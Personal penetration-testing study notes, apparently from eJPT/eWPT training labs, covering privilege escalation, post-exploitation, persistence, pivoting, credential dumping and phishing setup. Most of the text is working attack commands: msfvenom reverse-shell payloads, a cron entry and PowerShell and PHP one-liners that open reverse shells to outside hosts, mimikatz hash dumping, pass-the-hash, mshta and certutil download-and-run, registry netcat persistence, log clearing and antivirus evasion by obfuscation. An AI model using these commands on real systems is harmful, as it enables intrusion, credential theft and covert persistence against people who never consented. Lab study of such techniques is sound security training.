	> If we find ourselves with write access to a users/.ssh/ directory, we can place our public key in the user's ssh directory at /home/user/.ssh/authorized_keys. This technique is usually used to gain ssh access after gaining a shell as that user. The current SSH configuration will not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the -f flag to specify the output file

###Windows Privilege Escalation
[+] Resources
	> PrivEsc Checklists
  		https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	> Enumeration Scripts
		https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
		https://github.com/GhostPack/Seatbelt
		https://github.com/411Hall/JAWS
[+] Windows kernel
	> A kernel is a computer program that is the core of an operating system and has complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers
    	> Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:
      		+ User mode: Programs and services running in user mode have limited access to system resources and functionality
      		+ Kernel mode: Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.
[+] PowerShell-Empire
	> It is a pure PowerShell exploitation/post-exploitation framework built on cryptological-secure communications and flexible architecture
    	> Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable post-exploitation modules ranging from keyloggers to Mimikatz and adaptable communications to evade network detection, all wrapped up in a usability-focused framework
	> Starkiller is the GUI
    	> Usage
    		apt-get install powershell-empire starkiller -y
    	    	sudo powershell-empire server
    	    	sudo powershell-empire client
    	    		listeners
    	    	  	agents
    	    	starkiller (Default credentials: empireadmin:password123)
    
[+] Github tools
	https://github.com/AonCyberLabs/Windows-Exploit-Suggester
      	  systeminfo in the target machine and copy it to a .txt
      	  ./windows-exploit-suggester.py --update
      	  ./windows-exploit-suggester.py --database *.mssb.xls --systeminfo win7.txt
      	https://github.com/SecWiki/windows-kernel-exploits
      
[+] Saved windows credentials
    	cmdkey /list
    	runas /savecred /user:username cmd.exe
[+] Bypassing UAC with UACMe 
	In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.
    	UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.
[+] Metasploit
	search suggester
          use post/multi/recon/local_exploit_suggester
[+] Example with Metasploit
	setg rhosts 10.2.22.220
      	use exploit/windows/http/rejetto_hfs_exec
      		sysinfo
      	  	pgrep explorer
      	  	migrate 2448
      	  	sysinfo
      	  	getuid
      	  	getprivs
      	  	shell
      	  		net user m1l0js
      	  	  	net localgroup administrators
      	  	  	net user admin password123
      	  	  	(Not allowed)
      	  https://github.com/hfiref0x/UACME
      	  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.188.133 LPORT=1234 -f exe > backdoor.exe
      	  msfconsole
      		use multi/handler //Listening for new connections
      	    	set payload windows/meterpreter/reverse_tcp
      	  msfconsole 
      		cd C:\\ 
      	    	mkdir Temp
      	    	upload backdoor.exe
      	    	upload /root/Desktop/tools/UACME/Akagi64.exe
      	    	.\Akagi64.exe 23 C:\Temp\backdoor.exe

[+] Access Token Impersonation
    + Windows access tokens are created and managed by the Local Security Authority Subsystem Service (LSASS)
    + Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.
    + An access token will typically be assigned one of the following security levels:
      	> Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
        	Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
        	We can use the incognito module to display a list of available tokens that we can impersonate.
        	The following are the privileges that are required for a successful impersonation attack:
        	  - SeAssignPrimaryToken: This allows a user to impersonate tokens
        	  - SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
        	  - SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
      	> Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP
        	Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
    + Load incognito
	> Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation
      		list_tokens -u 
      		impersonate_token "ATTACKDEFENSE\Administrator"
      		getuid
      		getprivs
      		pgrep explorer
      		(finish it)
[+] Windows File system vulnerabilities --> ME INTERESA
* Alternate Data Streams
	> ADS is an NTFS(New Technology File System) file attribute and was designed to provide compatibility with the MacOS HFS(Hierarchical File System).
    	  Any file created on an NTFS formatted drive will have two different forks/streams:
		Data stream: Default stream that contains the data of the file
    	 	Resource stream: Typically contains the metadata of the file
    	> Attackers can use ADS to hide malicious code or executables in legitimate files in order to evade basic signature based AVs and static scanning tools. This can be done by storing the malicious code or executables in the file attribute resource stream (metadata) of a legitimate file. 
    	> notepad test.txt:secret.txt 
    	> change name winpeas.exe to payload.exe
    	> type payload.exe > windowslog.txt:winpeas.exe
    	> start windowslog.txt:winpeas.exe
    	> cd Windows\System32
    	> mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
    	> wupdate

[+] Windows Credential Dumping
	+ Windows Password Hashes
  		> Windows OS stores hashed user accounts and passwords locally in the SAM(Security Accounts Manager) database
  	  		The SAM database file cannot be copied while the operating system is running
  	  	    	The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
  	  	    	In modern versions of Windows, the SAM database is encrypted with a syskey.
  	  	> Authentication and verification of user credentials is facilitated by the LSA (Local Security Authority)
  	  		Elevated/Administrative privileges are required in order to access and interact with the LSASS process 
  	  	    	This service has a cache of memory with the hashes as it interacts with the SAM database
  	  	> Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards
    
	+ LM(LanMan)
		Default hashing algorithm that was implemented in Windows OS prior to NT4.0
      		[+] The password is broken into two seven-character chunks 
      		[+] All characters are then converted into uppercase
      		[+] Each chunk is then hashed separately with the DES algorithm.
      		> Weak protocol, primarily because the password hash does not include salts, consequently making brute-force and rainbow table attacks effective against LM hashes
      		> Example: Password123 => PASSWO ==> RD123 ==> DES ==> HASH1 + HASH2 ==> LM Hash

	+ NTLM(NTHash)
		When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
      		[+] Does not split the hash in to two chunks
      		[+] Case sensitive 
      		[+] Allows the use of symbols and unicode characters
      		[+] They do not have password salts, which means that can be cracked easy with rainbow tables or through brute-force attacks
      		> Example: !Passw0rd123. ==> MD4 ==> NTLM hash
[+] Searching for passwords in Windows Configuration files
	+ Unattended Windows Setup utility
		Windows can automate a variety of repetitive task(such as the installation of Windows on many systems) typically done through the use of the Unattended Windows Setup utility. 
      		This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password
      			[+] C:\Windows\Panther\Unattend.xml
      			[+] C:\Windows\Panther\Autounattend.xml
      		As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64
      	+ Example done by 2 ways:
      		msfconsole -q
      		use exploit/windows/misc/hta_server
      		exploit
      		“This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell". Copy the generated payload i.e “http://10.10.0.2:8080/6Nz7aySfPN.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell
        	Use your own metasploit HTA server link
            	mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
		msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
        	python3 -m http.server 80
        	VM: certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe
        	msfconsole 
        		use multi/handler
        	  	set payload windows/x64/meterpreter/reverse_tcp
        	  	meterpreter > search -f Unattend.xml
        	  	psexec.py Administrator@10.2.27.165

		Utilizing PowerUp.ps1
			. .\PowerUp.ps1
        		Invoke-PrivescAudit
        		How to base64 decode in Powershell?
        			$password=QWRtaW5AMTIz
        		  	$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($password))
        		  	echo $password
        		How to run a command as other user?
        		  	runas.exe /user:administrator cmd

[+] Dumping hashes with kiwi or mimikatz
	> The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashes user passwords.
    	> Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
    	> We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
    	> Mimikatz will require elevated privileges in order to run correctly.

    	> Example:
    		nmap 192.168.188.128
    	    	service postresql start && msfconsole -q 
    	    	use exploit/windows/http/badblue_passthru
    	    	sysinfo
    	    	getuid
    	    	pgrep lsass
    	    	migrate 788
    	    	getuid
		> Usage of Kiwi
    	    		load kiwi
    	    			creds_all
    	    		  	lsa_dump_sam
    	    		  	lsa_dump_secrets //Some clear password sometimes
		> Usage of mimikatz.exe
    	    		pwd
    	    		cd C:\\
    	    		mkdir Temp
    	    		cd Temp
    	    		upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
    	    		.\mimikatz.exe
    	    		  privilege::debug //To ensure that we have enough privileges
    	    		  lsadump::sam
    	    		  lsadump::secrets
    	    		  sekurlsa::logonpasswords //Clear passwords

[+] Pass-The-Hash attack
	> We can use multiple tools to facilitate this attack like Metasploit PsExec module or Crackmapexec
	> Metasploit PsExec module 
    		use exploit/windows/smb/psexec
    			set smbuser administrator
    	      		set smbpass (Paste LM:NTLM or the clear password)
    	      		set target Command
    	      		set target Native\ upload
    	      		sessions -K //To kill all the sessions
	> Crackmapexec 
    		crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)"
    	    	crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "ipconfig"
    	    	crackmapexec smb 192.168.188.126 -u Administrator -H "(NTLM hash here)" -x "net user administrator password123."


          

##Post-Exploitation
* Methodology
	1. Local Enumeration
		Enumerating System information
	    	Enumerating Users & Groups
	    	Enumerating Network Information
	    	Enumerating Services
	    	Automating Local Enumeration
	2. Transferring files
		Setting up a web server with Python
	    	Transferring files to windows targets
	    	Transferring files to linux targets
	3. Upgrading shells
		Upgrading command shells to meterpreter
	    	Spawning tty shells
	4. Privilege escalation
		Identifying PrivEsc Vulns
	    	Windows PrivEsc
	    	Linux PrivEsc
	5. Persistence
	    	Setting Up Persistence On Windows
	    	Setting Up Persistence On Linux
	6. Dumping & Cracking hashes
	    	Dumping & Cracking Windows Hashes
	    	Dumping & Cracking Linux Hashes
	7. Pivoting
	    	Internal Network Recon
	    	Pivoting
	8. Clearing tracks
	    	Clearing your tracks on Windows & Linux

* Windows Enumeration
    Windows Local Enumeration
      Enumerating System information
        We are looking for:
          - Hostname
          - OS Name(Windows 7,8,etc)
          - OS Build & Service Pack (Windows 7 SP1 7600)
          - OS Architecture (x64/x86)
          - Installed updates/Hotfixes
        meterpreter >
          getuid //Current user
          sysinfo
        shell >
          hostname
          systeminfo
          wmic qfe get Caption,Description,HotFixID,InstalledOn //Security Update
          cat C:\Windows\System32\eula.txt

      Enumerating Users & Groups
        We are looking for:
          - Current user & privileges
          - Additional user information
          - Other users on the system
          - Groups
          - Members of the built-in administrator group
        //The windows Administrator account is disabled by default unless it is explicitly enabled.
        meterpreter >
          getuid
          getprivs
          search logged_on //Enumerate current and recently logged users
        shell >
          whoami
          whoami /priv
          query user //Seet what users are logged on in addition to you
          net users
          net user administrator //Know more about a user
          net localgroup
          net localgroup administrators //Know the members of this group
      Enumerating Network Information
        We are looking for:
          - Current IP address & network adapter
          - Internal networks
          - TCP/UDP services running and their respective ports
          - Other hosts on the network
          - Routing table
          - Windows Firewall state
        shell > 
          ipconfig /all
          route print
          arp -a
          netstat -ano
          netsh firewall show state or netsh advfirewall firewall 
          netsh advfirewall show allprofiles
      Enumerating Processes & Services
        We are looking for:
          - Running processes & services
          - Scheduled tasks
        > A process is an instance of a running executable(.exe) or program
        > A service is a process which runs in the background and does not interact with the desktop
        meterpreter >
          ps 
          pgrep explorer.exe
          migrate 2176 //You can only migrate to a different process if you have an elevated session on the target system
        shell >
          net start //Services running in the background
          wmic service list brief
          tasklist /svc //List services running under that particular process
          schtasks /query /fo list /v
      
      Automating Windows Local Enumeration
        https://github.com/411Hall/JAWS //It should run on every Windows version since Windows 7
        meterpreter > 
          show_mount
        search win_privs
        search enum_logged_on_users 
        search checkvm
        search enum_applications //Applications installed
        search enum_computers //Is the host part of a domain
        search enum_patches //Patches installed
        search enum_shares
        powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    Linux Local enumeration
      Enumerating system information
        We are looking for: 
          - Hostname
          - Distribution & distribution release version
          - Kernel version & architecture
          - CPU information
          - Disk information & mounted drives
          - Installed packages/software
        bash > 
          hostname
          cat /etc/issue
          cat /etc/*release
          uname -a
          env //Enviromental variables
          lscpu
          free -h //Hos many RAM is consumed
          df -h
          df -ht ext4 
          lsblk | grep sd //Storage devices
          dpkg -l
    Enumerating users & groups
      groups
      groups bob
      cat /etc/passwd 
      useradd -m bob -s /bin/bash 
      usermod -aG root bob //To which group and who user?
      w or who 
      last //by ssh or console
      lastlog  //List of users of have recently logged in to the system
    Enumerating Network Information
      We are looking for:   
        - Current IP address & network adapter
        - Internal networks
        - TCP/UDP services running and their respective ports
        - Other hosts on the network
      meterpreter >
        ifconfig
        netstat 
        route
        arp
      shell > 
        ip a 
        cat /etc/networks //List of interfaces 
        cat /etc/hostname
        cat /etc/hosts
        cat /etc/resolv.conf //DNS server by default
        arp -a
    Enumerating processes & cron jobs
      We are looking for:
        - Running services
        - Cron jobs
      msfconsole >
        ps
      shell >
        ps
        ps aux
        top
        crontab -l
        ls -la /etc/cron* //Display all cron jobs
    Automating Linux Local Enumeration
      search enum_configs
      search enum_network
      search enum_system
      search checkvm
      https://github.com/rebootuser/LinEnum

Transferring files to Windows & Linux targets
* Using python server
	Setting up a web server with Python
	    Python2 ==> SimpleHTTPServer
	    Python3 ==> http.server
	Transferring files to windows targets
  	  certutil -urlcache -f http://10.10.4.2/mimikatz.exe mimikatz.exe
  	Transferring files to Linux targets
  	  cd /tmp
  	  cd /usr/share/webshells/php/
  	  python3 -m http.server 80
  	  wget http://10.10.3.4/php-backdoor.php
    		If the remote server does not have wget, we can use cURL to download the file:
			curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
* Using scp
	Granted we have obtained ssh user credentials on the remote host.
		scp linenum.sh user@remotehost:/tmp/linenum.sh
* Using base64
	Maybe, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it. For example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:
		base64 shell -w 0
	Now, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file
		echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
	Finally, we can use md5sum to ensure that the file not mess up
	

Shells
  Upgrading non-interactive shells (Linux post exploitation)
    //Which shells the system has?
      cat /etc/shells
    Is python installed?
      python --version
      python -c 'import pty; pty.spawn("/bin/bash")'
    Is perl installed?
      perl -e 'exec "/bin/bash";'
      perl: exec "/bin/bash";
    Is ruby installed?
      ruby: exec "/bin/bash"
  Now, check the environmental variables
    env
    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    export TERM=xterm
    export SHELL=bash

Escalation
  Windows privilege escalation
    Identifying windows privilege escalation vulnerabilities
      https://github.com/itm4n/PrivescCheck
      use exploit/multi/script/web_delivery
        set target PSH\ (Binary)
        set payload windows/shell/reverse_tcp
        set PSH-EncodedCommand false
      //Upgrade normal shell to meterpreter
        set WIN_TRANSFER VBS
      //Once we have access we can use PrivescCheck
          powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
          runas.exe /user:administrator cmd
      //In our machine
        //This module hosts an HTML Application (HTA) that when opened will run a payload via
Powershell
        use exploit/windows/misc/hta_server
      //In victim
        mshta.exe http://10.10.15.2:8080/jxEyD3w.hta

    Windows Privilege escalation
      //Supose that we have obtained valid credentials. After obtaining user account credentials, what protocols can we use to authenticate with the Windows target 
      //Without Metasploit
        psexec.py administrator@10.10.5.10 
      //With Metasploit
        use exploit/windows/smb/psexec
          set smbuser 
          set smbpass
            
Linux Privilege Escalation
	> PrivEsc Checklists
		https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
		https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
	> Enumeration Scripts
		https://github.com/rebootuser/LinEnum.git
		https://github.com/sleventyeleven/linuxprivchecker
		https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
		
  Weak Permissions
    cat /etc/passwd
    cat /etc/groups 
    groups student
    find / -not -type l -perm -o+w
    // /etc/shadow is writable
      openssl passwd -1 -salt abc password //-1 is the lower level of hash
      vim /etc/shadow
  SUDO privileges
    sudo -l
        
Persistence
    Windows Persistence
        Persistence Via Services
            msfconsole -q 
                ps -S explorer.exe
                migrate 3124
                search persistence_service
                use multi/handler
                    set payload windows/meterpreter/reverse_tcp
        Persistence via RDP
            meterpreter >
                run getgui -e -u m1l0js -p m1l0js_123321
                //getgui command makes the below changes to the target machine
                ● Enable RDP service if it’s disabled
                ● Creates new user for an attacker
                ● Hide user from Windows Login screen
                ● Adding created user to "Remote Desktop Users" and "Administrators" groups
            //Now we can access via RDP
            xfreerdp /u:m1l0js /p:m1l0js_123321 /v:10.2.18.93
            //Think as a red teamer and create a user like guest instead of the normal Guest

    Linux persistence
        Persistence via SSH Keys
            //In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password
            // After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access
            scp student@192.63.238.3:~/.ssh/id_rsa .
            chmod 400 id_rsa
            ssh -i id_rsa student@192.63.238.3
          Create a ssh key pair
            ssh-keygen -v 4096
            //Pass your id_rsa.pub
              ssh-copy-id root@10.10.13.4
            //At this moment, authorized keys exists
        Persistence via Cron Jobs
          Cron jobs = schedule tasks(Windows)
          * * * * * command to execute
          min(0-59)
          hour(0-23)
          day of month(1-31)
          month(1-12)
          day of week(0-7)
          //Example
            echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/1234 0>&1'" > cron
            crontab -l  //List cron jobs
            crontab -i cron //Include our cron job
          //Other example
            echo " * * * * * cd /home/student/ && python3 -m http.server 8000" > cron
            crontab -i cron
            crontab -l

Dumping & Cracking 
  Dumping & cracking NTLM hashes(Windows)
    meterpreter >
      pgrep lsass 
      migrate 708
      hashdump //List NTLM hashes
    //Crack it with meterpreter
      use auxiliary/analyze/crack_windows
    //Crack it with John
      john --list=formats
      john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
    //Crack it with hashcat
      hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
    
  Dumping & cracking Linux password hashes
    use exploit/unix/ftp/proftpd_133c_backdoor
    use post/linux/gather/hashdump
    //Crack it with john
      john --format=sha512crypt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
      john --show
    //Crack it with hashcat
      hashcat --help | grep 1800
      hashcat -a 3 -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt

Pivoting
  meterpreter > 
    run autoroute -s 10.0.29.0/20 
    run autoroute -p //List active routing table
  use auxiliary/scanner/portscan/tcp
  meterpreter >
    portfwd add -l 1234 -p 80 -r 10.0.29.96
  use badblue_passthru 
    set payload windows/meterpreter/bind_tcp


Clearing your tracks
  Windows
    use exploit/windows/local/persistence_service 
      resource ....rc //It will clear the traces and the .exe generated with this module
    meterpreter > 
      clearev

  Linux
    history -c 
    cat /dev/null  > bash_history
###Persistence
* What if we have to be persistent?
	[+] Using netcat
		We need to modify the regedit
      			1. Go to Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
      		  	2. New ==> String ==> Type the name of the netcat file (for example winconfig)
      		  	3. Edit string ==> Value data ==> "C:\Windows\System32\winconfig.exe 192.168.0.10 4126 -e cmd.exe"

	[+] Using Metasploit
  		use exploit/windows/local/s4u_persistence
  	  	show options
  	  	sessions
  	  	set session 2
  	  	set trigger logon
  	  	set payload windows/meterpreter/reverse_tcp
  	  	set lhost 192.168.0.10
  	  	set lport 4126
  	  	show options
  	  	exploit
###Lateral Movement 
* How to pivot into networks?
	[+] Using Metasploit
		Add a route
			run autoroute -h
      			2 different ways 
      				> run autoroute -s 192.222.74.0/24 or run autoroute  -s 192.222.74.0 -n 255.255.255.0
      			  	> route add 192.222.74.0 255.255.255.0 1(meterpreter session ID)
      			background
      			route print

    		use exploit/multi/handler
    		set paload windows/meterpreter/reverse_tcp
    		show options
    		set lport 4126
    		screenshot
    		download personal_information.txt /root/Desktop
    		upload ..
    		sysinfo
    		ps

###Password attacks
* When you log into your computer, you type your username and password. The operating system takes the password, hashes it and then tries to match the result against the saved hash in the password database. If the two values match, you log in successfully. The operating system does not need to know the clear-text password.

* John the Ripper 
	[+] List of accepted formats
		john --list=formats
    	[+] To perform a pure brute force attack over a users list:
    		john --incremental --users:<users list> <file to crack>
    		john --wordlist=rockyou.txt --rules --users=victim1,victim2 hash //Other way
    	[+] Using single crack mode
    		john --single --format=[format] [path to file]
    	[+] To display the password recovered:  
    		john --show crackme
    	[+] Default file where the cracked passwords are stored by John
    		/root/.john/john.pot
    	[+] It is a good idea if we are in Linux to check the 
    		/etc/login.defs to see the hash algorithm used to hash the password present in the shadow file
    	[+] Cool features
		/usr/share/john/office2john.py when .docx documents
    	[+] Unshadowing
    		unshadow - Invokes the unshadow tool
    	  	unshadow [path to passwd] [path to shadow] > crackme.txt
    	  	[path to passwd] - The file that contains the copy of the /etc/passwd file you've taken from the target machine
    	  	[path to shadow] - The file that contains the copy of the /etc/shadow file you've taken from the target machine 
    	
* Rainbow table
	[+] It is a table containing links between the results of a run of one hashing function and another.
	[+] For Windows ==> ophcrack.

* Hashcat 
	[+] Relies in GPU instead of CPU
	[+] List of accepted formats
		hashcat --example-hashes

	[+] First steps
    		hashcat -b //First step
    		hashcat -m 0 -a 0 -D2 example.hash example.dict

	[+] Rules file
    		--rules-file ==> check it in hashcat page
  	[+] URLs
  		https://wiki.skullsecurity.org/index.php/Passwords //Other 



  

          

Windows Black Box Penetration Test
  Port scanning & enumeration
  Targeting Microsoft IIS FTP
    In most cases, the FTP server is used to transfer files to and from the directory of the web server. As a result, if we are able to gain access to the FTP server, we may be able access the directory of the Microsoft IIS web server.
    nmap -sV -p21 --script=ftp-anon 10.0.28.97
    //If we need valid credentials, we could use hydra with different lists users/passwords or users/users
    ftp 10.0.28.97 21
    msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
  Targeting SMB
    enum4linux -u vagrant -p vagrant 10.10.16.3 //Enumerate other user accounts
    python3 psexec.py administrator@10.10.16.3
  Targeting mysql
    //Once we are in, we could change several things
      UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin'; //For example
    Change the content in phpmyadmin.conf to Allow from all
    //Once you have done changes regarding with Apache you have to restart this service. This can be done with
      net stop wampapache
      net start wampapache

Linux exploitation
  Brute force with SMTP to a vulnerable vsftpd 
    msfconsole -q
      search smtp_enum
    //Once you have some users
    hydra -l service -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt 10.2.17.5 ftp 
    //UPload a reverse shell 
    ls -al /usr/share/webshells/php-reverse-shell.php
    cp /usr/share/webshells/php-reverse-shell.php . //Change $ip and $port
    ftp 10.2.17.5 21
    cd /var/www/
    cd dav
    put shell.php //and nc -nvlp 1234 in our machine
  
  Targeting PHP
    10.2.19.172/phpinfo.php //Know some useful info with its version
    searchsploit php cgi //Lower than 5.3.12
    //We could use exploit/multi/http/php_cgi_arg_injection
    //If we try to modify 18836.py we could use this one liner to obtain a reverse shell
      $sock=fsockopen("IP",1234);exec("/bin/sh -i <&4 >&4 2>&4");

  Targeting Samba
   msfconsole -q
    search smb_version //It is valid for samba and smb
    use auxiliary/scanner/smb/smb_version  
AV evasion with Shelter
  Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include:
    - Uninstalling/disabling security software 
    - Obfuscating/encrypting data and scripts
    - Leverage and abuse trusted processes to hide and masquerade their malware
  //We are going to try to change the signature of the malicious executable that we are generating
  AV detection methods
    1. Signature based detection: An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database. 
      We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature
    2. Heuristic-based detection: Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls
    3. Behavior based detection: Relies on identifying malware by monitoring it's behavior. Used for newer strains of malware
  AV evasion techniques
    On-disk evasion techniques
      1.  Obfuscation: Obfuscation relies to the process of concealing something important, valuable or critical. It reorganizes code in order to make it harder to analyze or RE
      2.  Encoding: Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format
      3.  Packing: Generate executable with the new binary structure with a smaller size and therefore provides the payload with a new signature
      4.  Crypters: Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub
    In-Memory evasion techniques
      1.  Focuses on manipulation of memory and does not write files to disk
      2.  Injects payload into a process by leveraging various Windows APIs
      3.  Payload is then executed in memory in a separate thread
  Usage of shellter
    https://www.shellterproject.com/introducing-shellter/
    apt-get install shellter -y
    //We also need to install wine 32-bit package because shellter only supports any 32-bit payload (generated either by metasploit or custom ones by the user).
    dpkg --add-architecture i386
    apt-get install wine32
    //We could use the vncviewer.exe 
    cp /usr/share/windows-binaries/vncviewer.exe /home/kali/Desktop/AVBypass
    cd /usr/share/windows-resources/shellter
    sudo wine shellter.exe
      Auto mode
      /home/kali/Desktop/AVBypass/vncviewer.exe
      //Shellter will trace a random number of instructions 
      Enable Stealth Mode? Yes //If you want that executable work as intended.
      Payload? Listed payload 
      set lhost
      set lport
      msfconsole -q
        use multi/handler
        set payload windows/meterpreter/reverse_tcp
      python3 -m http.server 80
        //Execute it in the Windows machine 
  Obfuscating Powershell code
    git clone https://github.com/danielbohannon/Invoke-Obfuscation
    Use a reverse shell in powershell and save it as shell.ps1
      powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    apt-get install powershell -y
    pwsh
      cd ./Invoke-Obfuscation
      Import-Module ./Invoke-Obfuscation.ps1
      cd ..
      Invoke-Obfuscation
        SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
0-0-0-0-0-0-

Social Engineering 
  GoPhish
    1. New sending profile
      from: info <support@demo.ine.local>
      Host: localhost:25 //Where de stmp server is
      Username: red@demo.ine.local
    2. New landing page
      + Capture submitted data
      Redirect to: http://localhost:8080
    3. Email Templates
      Import email
    4. Users & Groups
      Import csv 
    5. Campaigns
      URL: http://localhost //It could be a cloud server

  
Web Application penetration testing: Introduction to the Web ahd HTTP protocol
  Intro to web
    //How to upload and delete files?
      curl 192.36.17.3/uploads/ --upload-file hello.txt
      curl -X DELETE 192.36.17.3/uploads/hello.txt
  Gobuster
    gobuster dir -u http://192.19.3.2 -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
  Nikto
    nikto -h http://192.158.187.3/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -Display V -o nikto.html -Format htm
  Passive crawler with BurpSuite
    Dashboard > Capturing 
  If with BurpSuite we have a header Authorization: Basic ==> We can base64-decode ==> Add Prefix to admin: ==> Add another payload processing to encode the payload to base64

-=-=-==============-----------------------------------------============
eWPT(Notes)
The Rules of Engagement
  Why do you want to execute a penetration tester?
  When creating a timetable, it should contain at least the following information:
    - Target(s)
    - Start (format: Date-time)
    - End   (format: Date-time)
    - Criticality of test(format: text) //Medium, High, Low
    - Step in process(format: text) //Scanning, OS detection, exploitation, etc
    - Source IP address
A non-disclosure agreement
An emergency plan involves:
  - The timetable
  - The contact in charge of responding to the emergency plan
  - The solutions to apply to the issue
Methodologies
  http://www.pentest-standard.org/index.php/Main_Page
  https://owasp.org/www-project-web-security-testing-guide/
The reporting phase
  Freemind(http://freemind.sourceforge.net/wiki/index.php/Download) //Mind mapping
  Your penetration test report's target audience groups are:
    - Executive: You have to speak in terms of metrics, risk mitigation and money loss
    - IT Department: Which areas or departments are more affected and to what kind of vulnerabilities
    - Development: Your exploits, your POCs, remediation tips, source code, etc
  A typical structure
    Executive summary(2-3 pages)
      //"The purpose of this assessment and report is to identify any web application issues that could affect ABC, Inc and the web server hosting it and to provide solutions to remedy these same issues. "
    Vulnerability report => Remediation report

Basics
  HTTP protocol basics
    Format of an HTTP message is
      HEADERS\r\n
      \r\n

      MESSAGE BODY\r\n

      \r(Carriage Return): moves the cursor to the beginning of the line
